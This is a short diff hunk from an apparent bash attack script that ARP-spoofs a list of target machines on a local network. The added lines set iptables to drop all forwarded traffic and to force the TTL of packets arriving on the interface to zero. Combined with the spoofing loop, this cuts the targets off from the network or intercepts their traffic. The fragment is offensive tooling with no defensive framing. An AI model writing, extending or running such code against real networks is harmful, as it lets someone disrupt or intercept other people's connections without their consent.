@@ -211,6 +211,10 @@ if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
     exit 0
 fi
 
+# iptables policy
+iptables -P FORWARD DROP
+iptables -t mangle -I PREROUTING -i "$INTERFACE" -j TTL --ttl-set 0
+        
 # Start ARP spoofing for each target
 PIDS=()
 for TARGET in "${TARGETS[@]}"; do
